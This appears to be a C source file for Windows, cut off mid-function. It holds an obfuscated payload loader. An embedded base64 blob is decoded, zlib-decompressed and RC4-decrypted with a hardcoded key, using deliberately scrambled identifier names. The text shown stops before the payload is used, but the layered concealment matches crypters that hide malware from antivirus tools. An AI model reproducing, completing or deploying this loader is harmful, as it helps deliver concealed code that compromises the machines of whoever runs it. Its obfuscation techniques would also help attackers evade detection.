#include <windows.h>
#include <string.h>
#include <zlib.h>
#include <stdio.h>


unsigned char aCbEc8BuT[] = "\x54\x38\x46\x77\x45\x39\x4d\x68\x37\x36\x75\x4e\x49\x6d\x32\x75\x35\x30\x49\x59\x2f\x53\x4c\x72\x4e\x33\x35\x41\x42\x50\x4b\x43\x6c\x4d\x35\x62\x43\x6e\x76\x72\x4b\x78\x61\x6b\x49\x45\x57\x74\x4b\x61\x30\x42\x7a\x55\x4a\x42\x54\x49\x53\x6f\x63\x64\x57\x47\x57\x76\x4f\x71\x77\x65\x2f\x4c\x57\x4f\x51\x56\x7a\x6e\x46\x41\x6d\x6e\x59\x6a\x46\x46\x62\x42\x56\x6d\x79\x50\x56\x64\x43\x67\x36\x76\x4b\x69\x64\x65\x44\x63\x31\x4f\x34\x39\x6d\x43\x6e\x5a\x43\x53\x75\x64\x57\x74\x45\x49\x6b\x7a\x2b\x75\x47\x7a\x70\x32\x5a\x63\x54\x42\x6c\x53\x35\x2b\x54\x61\x59\x2b\x36\x5a\x70\x6d\x56\x49\x4c\x70\x62\x65\x42\x4d\x68\x4c\x68\x62\x46\x78\x6b\x6f\x45\x4b\x65\x59\x74\x79\x78\x51\x63\x68\x65\x4d\x2b\x4f\x6e\x49\x6e\x79\x6c\x36\x4b\x56\x4e\x73\x76\x52\x61\x37\x70\x68\x72\x36\x62\x4b\x4f\x34\x66\x4b\x44\x50\x79\x58\x4a\x58\x58\x2f\x75\x65\x2f\x33\x6a\x64\x65\x43\x30\x78\x55\x6d\x72\x6e\x73\x33\x55\x79\x77\x52\x47\x56\x4a\x58\x4c\x6c\x76\x58\x51\x43\x59\x53\x30\x50\x4c\x7a\x51\x79\x38\x42\x6d\x50\x56\x67\x62\x46\x72\x30\x64\x53\x39\x76\x7a\x33\x6f\x6c\x61\x57\x79\x49\x6b\x67\x52\x48\x53\x4d\x36\x4c\x78\x68\x38\x77\x70\x55\x69\x45\x75\x78\x74\x70\x68\x57\x52\x45\x41\x73\x43\x70\x34\x50\x4a\x5a\x51\x34\x30\x35\x67\x65\x61\x2b\x6e\x59\x52\x34\x57\x59\x2f\x4d\x4d\x6a\x59\x31\x76\x39\x4d\x57\x72\x50\x30\x39\x47\x54\x4f\x59\x74\x73\x65\x42\x5a\x78\x72\x73\x55\x61\x6f\x42\x67\x5a\x78\x70\x57\x46\x6b\x68\x41\x37\x6d\x42\x5a\x2f\x65\x41\x54\x38\x58\x54\x46\x4f\x30\x47\x61\x57\x72\x75\x66\x4b\x46\x4d\x45\x32\x4e\x4f\x51\x3d";
unsigned char QFBq5Nzwi2HmEpyYdaI3cG39XY9qS5hpgdGo99nGo0EGNBD1sloiC8Lqgh17qya3LUtX8ony[] = "\xa4\x1d\x14\x00";
unsigned char WI7FI7u1jDZtNeAWi4v41yoSwWq4nrrWJEEcUaGHh68LHXxQoS5zWyExSRbX8R5pH9iJ3Rta87bVI2uHXHsqB3qpnCYqIKA_BiStCqw68h9wea0_14gFjVkG95TIW06oF05igDnxG5yR7GPQxsppo3H9TIxrRAKlXsjH4j[] = "\xb3\xcd\x33\xf0\xd8\xef\x57\x7e";
#define KEY_SIZE 1


static const unsigned char cY_TeMP2RfGArEIAc88XHl2MNIF4Vvh0iUQz_G_R_54kAxhG7x1PvGsFbNtOcpQJZHpL248OuTvKsV4iqqb5D91hgIG2k4wtgzSHm2NDWgIL2y2zLphHTgvGRhzVt27Ks24FkVXr0XnUt04zZ9PHeYlMUunjwNiXoIS411qeVdCWP8iifqy21ODJuyMFYff_5xGLDwGuFNLozMNiLlNl5z5jYgvsNRwqz20uoPLD0ZR2w[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};


int vt7IcyxCZk8dGmpDa_qN3WG6rAdtwNU17qUlv3G0r2bH4IG0DiZiighQe4qLuBLvdkiGGzoXWBTlPtKK1vo689t7tNi58J0yaO96zsvP1d6fRw1ziossGgH3ImHSxduxY(const unsigned char *cZE78j6X1_078lJpTaJEVqwqFYFjTludYBAQdGo_EYOqQ5L8fXWveZtpFdp2EdOam, int bbL5VXLEzDLwdazxELXt7nN7LtZUiwza_ssaY2ChLa2wkEoUwjrYy0AiVG4ojZ7YjmMHLCEq9xTGzAhxw966Jck5xNGjfBMnR0oI_v9devTygjHWiCjlTCTg2_9JYd6F44ir78T9J11g8xtAndnpOnLAfN6ktTiw6JK0JbprFRmQKZ9BqM2Yp9ynQ2yQBVmst4ufYtuI4XosH6bJBxtAOo0pMYa588sEv8IPeVJ0OzXl, unsigned char *acu46rZnjpUwl1a29R4Opj59djQ7bSkTcN_mVfZsKx9x2OdfyO7RA2dAdRv_E8Py9wlJKRhz8J4l_iJyYsshPOhFzdy9GOJBiCXZJMovw1vgpkZs9hlcHdSeC6Tg09no02mUJvnoqinMmj5B5KdlBNTvYRITqwG7TETw_cj3j64TnAcBXUr4QLZEU3ykE7mP67kIVUh_KZNMzpUu4HKZIzWllqM2AARNvdlErsnAhygE) {
    printf("[~] Starting base64 decode\n");
    int j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq, KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm = 0;
    unsigned char hWWHGKn_DiX5fcOxjFLlW3rlMLOBG4QMFREnUNRjbuxrgTb81VAAdony8alw0Phd4KH3d17WzuKxy, b, c, d;
    
    for (j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq = 0; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq < bbL5VXLEzDLwdazxELXt7nN7LtZUiwza_ssaY2ChLa2wkEoUwjrYy0AiVG4ojZ7YjmMHLCEq9xTGzAhxw966Jck5xNGjfBMnR0oI_v9devTygjHWiCjlTCTg2_9JYd6F44ir78T9J11g8xtAndnpOnLAfN6ktTiw6JK0JbprFRmQKZ9BqM2Yp9ynQ2yQBVmst4ufYtuI4XosH6bJBxtAOo0pMYa588sEv8IPeVJ0OzXl; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq += 4) {
        hWWHGKn_DiX5fcOxjFLlW3rlMLOBG4QMFREnUNRjbuxrgTb81VAAdony8alw0Phd4KH3d17WzuKxy = cY_TeMP2RfGArEIAc88XHl2MNIF4Vvh0iUQz_G_R_54kAxhG7x1PvGsFbNtOcpQJZHpL248OuTvKsV4iqqb5D91hgIG2k4wtgzSHm2NDWgIL2y2zLphHTgvGRhzVt27Ks24FkVXr0XnUt04zZ9PHeYlMUunjwNiXoIS411qeVdCWP8iifqy21ODJuyMFYff_5xGLDwGuFNLozMNiLlNl5z5jYgvsNRwqz20uoPLD0ZR2w[cZE78j6X1_078lJpTaJEVqwqFYFjTludYBAQdGo_EYOqQ5L8fXWveZtpFdp2EdOam[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq]];
        b = cY_TeMP2RfGArEIAc88XHl2MNIF4Vvh0iUQz_G_R_54kAxhG7x1PvGsFbNtOcpQJZHpL248OuTvKsV4iqqb5D91hgIG2k4wtgzSHm2NDWgIL2y2zLphHTgvGRhzVt27Ks24FkVXr0XnUt04zZ9PHeYlMUunjwNiXoIS411qeVdCWP8iifqy21ODJuyMFYff_5xGLDwGuFNLozMNiLlNl5z5jYgvsNRwqz20uoPLD0ZR2w[cZE78j6X1_078lJpTaJEVqwqFYFjTludYBAQdGo_EYOqQ5L8fXWveZtpFdp2EdOam[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq + 1]];
        c = cY_TeMP2RfGArEIAc88XHl2MNIF4Vvh0iUQz_G_R_54kAxhG7x1PvGsFbNtOcpQJZHpL248OuTvKsV4iqqb5D91hgIG2k4wtgzSHm2NDWgIL2y2zLphHTgvGRhzVt27Ks24FkVXr0XnUt04zZ9PHeYlMUunjwNiXoIS411qeVdCWP8iifqy21ODJuyMFYff_5xGLDwGuFNLozMNiLlNl5z5jYgvsNRwqz20uoPLD0ZR2w[cZE78j6X1_078lJpTaJEVqwqFYFjTludYBAQdGo_EYOqQ5L8fXWveZtpFdp2EdOam[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq + 2]];
        d = cY_TeMP2RfGArEIAc88XHl2MNIF4Vvh0iUQz_G_R_54kAxhG7x1PvGsFbNtOcpQJZHpL248OuTvKsV4iqqb5D91hgIG2k4wtgzSHm2NDWgIL2y2zLphHTgvGRhzVt27Ks24FkVXr0XnUt04zZ9PHeYlMUunjwNiXoIS411qeVdCWP8iifqy21ODJuyMFYff_5xGLDwGuFNLozMNiLlNl5z5jYgvsNRwqz20uoPLD0ZR2w[cZE78j6X1_078lJpTaJEVqwqFYFjTludYBAQdGo_EYOqQ5L8fXWveZtpFdp2EdOam[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq + 3]];
        
        acu46rZnjpUwl1a29R4Opj59djQ7bSkTcN_mVfZsKx9x2OdfyO7RA2dAdRv_E8Py9wlJKRhz8J4l_iJyYsshPOhFzdy9GOJBiCXZJMovw1vgpkZs9hlcHdSeC6Tg09no02mUJvnoqinMmj5B5KdlBNTvYRITqwG7TETw_cj3j64TnAcBXUr4QLZEU3ykE7mP67kIVUh_KZNMzpUu4HKZIzWllqM2AARNvdlErsnAhygE[KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm++] = (hWWHGKn_DiX5fcOxjFLlW3rlMLOBG4QMFREnUNRjbuxrgTb81VAAdony8alw0Phd4KH3d17WzuKxy << 2) | (b >> 4);
        if (c != 64) acu46rZnjpUwl1a29R4Opj59djQ7bSkTcN_mVfZsKx9x2OdfyO7RA2dAdRv_E8Py9wlJKRhz8J4l_iJyYsshPOhFzdy9GOJBiCXZJMovw1vgpkZs9hlcHdSeC6Tg09no02mUJvnoqinMmj5B5KdlBNTvYRITqwG7TETw_cj3j64TnAcBXUr4QLZEU3ykE7mP67kIVUh_KZNMzpUu4HKZIzWllqM2AARNvdlErsnAhygE[KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm++] = (b << 4) | (c >> 2);
        if (d != 64) acu46rZnjpUwl1a29R4Opj59djQ7bSkTcN_mVfZsKx9x2OdfyO7RA2dAdRv_E8Py9wlJKRhz8J4l_iJyYsshPOhFzdy9GOJBiCXZJMovw1vgpkZs9hlcHdSeC6Tg09no02mUJvnoqinMmj5B5KdlBNTvYRITqwG7TETw_cj3j64TnAcBXUr4QLZEU3ykE7mP67kIVUh_KZNMzpUu4HKZIzWllqM2AARNvdlErsnAhygE[KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm++] = (c << 6) | d;
    }
    printf("[+] Base64 decode completed: %d bytes\n", KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm);
    return KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm;
}


int kmGn0X7sI7QvA0s8gvkyawpRx3T2o6BsmRvI8jg2SDpYRKq84ckNizHQfTWIHdw8sZv8MxAIQUagoxLUkLc5Pwp1uYMZh7ayRwEsC8rlm0VdGgzIZ1FT0HsBp6bxM966Rqt8ZrmmvKeqPhvry1WMMYyzWGZhRqFSDOCSaw32dJbj0QO4vNCLdaB9OirmFH3(const unsigned char *cZE78j6X1_078lJpTaJEVqwqFYFjTludYBAQdGo_EYOqQ5L8fXWveZtpFdp2EdOam, int bbL5VXLEzDLwdazxELXt7nN7LtZUiwza_ssaY2ChLa2wkEoUwjrYy0AiVG4ojZ7YjmMHLCEq9xTGzAhxw966Jck5xNGjfBMnR0oI_v9devTygjHWiCjlTCTg2_9JYd6F44ir78T9J11g8xtAndnpOnLAfN6ktTiw6JK0JbprFRmQKZ9BqM2Yp9ynQ2yQBVmst4ufYtuI4XosH6bJBxtAOo0pMYa588sEv8IPeVJ0OzXl, unsigned char *acu46rZnjpUwl1a29R4Opj59djQ7bSkTcN_mVfZsKx9x2OdfyO7RA2dAdRv_E8Py9wlJKRhz8J4l_iJyYsshPOhFzdy9GOJBiCXZJMovw1vgpkZs9hlcHdSeC6Tg09no02mUJvnoqinMmj5B5KdlBNTvYRITqwG7TETw_cj3j64TnAcBXUr4QLZEU3ykE7mP67kIVUh_KZNMzpUu4HKZIzWllqM2AARNvdlErsnAhygE, int J7FYOjnhPAUWsDgobyzdlKAHwmh9u50zzNOM51notnRDt3HBqTMFMclo1e0Cfun_3TvOQkXFswKYkyDwERZwc4Q6APtJg524cRo7IF4H_wgOrd7L9RatbESMz3IHprMSVtM4nWlWjQuNtthuHyzCAuvlNDkU7MZLNCNXAzDSUJ7F90OWYebjcZh9I69No1Kbz1Qdd3hywVKdLnXKoq2lC2tPByTzXqXg470ZMT_tRJSm08ShEgRhPQF_) {
    printf("[~] Starting zlib decompression\n");
    uLongf dest_len = (uLongf)J7FYOjnhPAUWsDgobyzdlKAHwmh9u50zzNOM51notnRDt3HBqTMFMclo1e0Cfun_3TvOQkXFswKYkyDwERZwc4Q6APtJg524cRo7IF4H_wgOrd7L9RatbESMz3IHprMSVtM4nWlWjQuNtthuHyzCAuvlNDkU7MZLNCNXAzDSUJ7F90OWYebjcZh9I69No1Kbz1Qdd3hywVKdLnXKoq2lC2tPByTzXqXg470ZMT_tRJSm08ShEgRhPQF_;
    int exZH0bczmeMvJi2Jmb35GgVZAoR9IWkU5YOi3jseWkaA9XBaaMIvSxI9DXUP_jx1jHgWh4_WZZIDy2ulqmUbrWVZNKOSRbT3u9znuEJDF52k1RqnlRXf7uggkL_AbJTmVB5s0al8TcXvsxCxBfAxo0IAU6Avo0q1w3hbCp3SdSxjAfSqLN2oHMoowOK5kpwuWM9n9LiAqowrbpOpBU0YzxCdhpFDvXb = uncompress(acu46rZnjpUwl1a29R4Opj59djQ7bSkTcN_mVfZsKx9x2OdfyO7RA2dAdRv_E8Py9wlJKRhz8J4l_iJyYsshPOhFzdy9GOJBiCXZJMovw1vgpkZs9hlcHdSeC6Tg09no02mUJvnoqinMmj5B5KdlBNTvYRITqwG7TETw_cj3j64TnAcBXUr4QLZEU3ykE7mP67kIVUh_KZNMzpUu4HKZIzWllqM2AARNvdlErsnAhygE, &dest_len, cZE78j6X1_078lJpTaJEVqwqFYFjTludYBAQdGo_EYOqQ5L8fXWveZtpFdp2EdOam, (uLong)bbL5VXLEzDLwdazxELXt7nN7LtZUiwza_ssaY2ChLa2wkEoUwjrYy0AiVG4ojZ7YjmMHLCEq9xTGzAhxw966Jck5xNGjfBMnR0oI_v9devTygjHWiCjlTCTg2_9JYd6F44ir78T9J11g8xtAndnpOnLAfN6ktTiw6JK0JbprFRmQKZ9BqM2Yp9ynQ2yQBVmst4ufYtuI4XosH6bJBxtAOo0pMYa588sEv8IPeVJ0OzXl);
    
    if (exZH0bczmeMvJi2Jmb35GgVZAoR9IWkU5YOi3jseWkaA9XBaaMIvSxI9DXUP_jx1jHgWh4_WZZIDy2ulqmUbrWVZNKOSRbT3u9znuEJDF52k1RqnlRXf7uggkL_AbJTmVB5s0al8TcXvsxCxBfAxo0IAU6Avo0q1w3hbCp3SdSxjAfSqLN2oHMoowOK5kpwuWM9n9LiAqowrbpOpBU0YzxCdhpFDvXb != Z_OK) {
        printf("[x] Zlib decompression failed: error %d\n", exZH0bczmeMvJi2Jmb35GgVZAoR9IWkU5YOi3jseWkaA9XBaaMIvSxI9DXUP_jx1jHgWh4_WZZIDy2ulqmUbrWVZNKOSRbT3u9znuEJDF52k1RqnlRXf7uggkL_AbJTmVB5s0al8TcXvsxCxBfAxo0IAU6Avo0q1w3hbCp3SdSxjAfSqLN2oHMoowOK5kpwuWM9n9LiAqowrbpOpBU0YzxCdhpFDvXb);
        return 0;
    }
    
    printf("[+] Zlib decompression completed: %d bytes\n", (int)dest_len);
    return (int)dest_len;
}


typedef struct {
    unsigned char d0xyea4l[256];
    unsigned char j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq;
    unsigned char KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm;
} kErcei1OPwpxQPUMb;


void SJ_aEnvCcNgJvUZu9nuqthbO9IaIInD2VKRZF9zguiQabUEUozbaAj_9jLNRc0a(kErcei1OPwpxQPUMb *st, const unsigned char *key, int lNBbV5Kyc_K27IYQxpHwpN1uttCW1Nz8Vly1A8cBbe0Qty80KmCggviRQdTx00IyfGru8rCE6aZQnvv0eziKI1wDlTbhQ84cFzOCcpX7x6jfHSTWbDUGoptJn_MjdIBDsDGpv4HFQzMK) {
    int j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq, KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm = 0;
    unsigned char nj1BKNazBTB49pCEsFR7c5_z3w958BsWYMeUQJVksp7NmCJ4iqegs9xeFHAupqg7X6F2zpjqQI3LBzK72aOYCRkYxCYFfHnO0l9EeXVPC202qbbOtJvBHDRYdRtCqdD6fe_dhzgju0r3aCnOBqXG7c4Aubk5O2Y7M5wue5i2x8tzVBB1PQct2AzyQC;
    
    for (j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq = 0; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq < 256; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq++) st->d0xyea4l[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq] = (unsigned char)j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq;
    st->j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq = 0;
    st->KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm = 0;
    
    for (j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq = 0; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq < 256; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq++) {
        KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm = (KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm + st->d0xyea4l[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq] + key[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq % lNBbV5Kyc_K27IYQxpHwpN1uttCW1Nz8Vly1A8cBbe0Qty80KmCggviRQdTx00IyfGru8rCE6aZQnvv0eziKI1wDlTbhQ84cFzOCcpX7x6jfHSTWbDUGoptJn_MjdIBDsDGpv4HFQzMK]) % 256;
        nj1BKNazBTB49pCEsFR7c5_z3w958BsWYMeUQJVksp7NmCJ4iqegs9xeFHAupqg7X6F2zpjqQI3LBzK72aOYCRkYxCYFfHnO0l9EeXVPC202qbbOtJvBHDRYdRtCqdD6fe_dhzgju0r3aCnOBqXG7c4Aubk5O2Y7M5wue5i2x8tzVBB1PQct2AzyQC = st->d0xyea4l[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq];
        st->d0xyea4l[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq] = st->d0xyea4l[KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm];
        st->d0xyea4l[KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm] = nj1BKNazBTB49pCEsFR7c5_z3w958BsWYMeUQJVksp7NmCJ4iqegs9xeFHAupqg7X6F2zpjqQI3LBzK72aOYCRkYxCYFfHnO0l9EeXVPC202qbbOtJvBHDRYdRtCqdD6fe_dhzgju0r3aCnOBqXG7c4Aubk5O2Y7M5wue5i2x8tzVBB1PQct2AzyQC;
    }
    st->j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq = 0;
    st->KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm = 0;
}


void rm5eGVP28cXJSfphHfbrg19YvX49WbPTSgJSxa68RawMgR6VR76h05rOggrgLVM_F_sY0ol2cDbKlrfTPaSzw9rW7i3wNYRN0y0ZpMtudxhDnmTCDZlA_jLd51kamTgE3_QLqtLZVEdhAh0Hd4FRn8dbT6FyueSvJdXISLQgcIofsXlIy564yimyhIzEFFKC7B3WuKjPZRTmLIlPKwdIGmvoGYXyfn(kErcei1OPwpxQPUMb *st, unsigned char *vhb8KlLDbkxn_jsFJvL575M9HkxDRZJzkyMT94zeeBbsLxrensdZGZglvo4SAX6aZI9CjGu6EsKv9y_AG1ISutyMVUrCx4d, int an4wbuF0b5BZHxxbzxJh8j8Akylc7DckvXCoYHswOnMaNn0_a06TNccEp3N28W5UsBJqF7Rfi9s01NKrQa002hyFidn5YK_dGYAn4vb9jCQYUtuMYW) {
    int o2IKcZeptpOhcCdP5xUlPs4tjzFNmj45jC4gQTAkDZVTDzdnE2Dp_pWxzz6X5rY_ibYV4xrX1mkh865q6weBrvfRHkGMC8o9cozAnCtg6J_Cp42qTIFKrBOuSi8HCrAHVGXAss1DJMWtXORt_aVCyzOupd9UFqUIJwS7aUwfDx2bU_EdAWMY7Vh1FgBXlWSi;
    unsigned char nj1BKNazBTB49pCEsFR7c5_z3w958BsWYMeUQJVksp7NmCJ4iqegs9xeFHAupqg7X6F2zpjqQI3LBzK72aOYCRkYxCYFfHnO0l9EeXVPC202qbbOtJvBHDRYdRtCqdD6fe_dhzgju0r3aCnOBqXG7c4Aubk5O2Y7M5wue5i2x8tzVBB1PQct2AzyQC, K;
    
